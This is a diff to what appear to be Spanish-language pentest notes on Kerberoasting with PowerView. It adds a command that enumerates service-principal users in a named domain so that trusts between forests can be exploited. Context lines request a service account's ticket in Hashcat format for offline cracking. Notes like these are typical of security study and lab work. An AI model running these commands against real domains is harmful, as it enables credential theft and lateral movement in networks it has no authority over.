@@ -19,6 +19,9 @@ Import-Module .\PowerView.ps1
 traer todos los users spn:
 Get-DomainUser * -spn | select samaccountname
 
+si queremos trar los spn de un domain en específico (para aprovechar confianzas entre forests)
+Import-Module .\powerview.ps1; Get-DomainUser -SPN -Domain <domain> | Select-Object SamAccountName
+
 traer el ticket de un usuario en especial:
 Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat    (esto no tre el ticket para copiar y pegar)
 
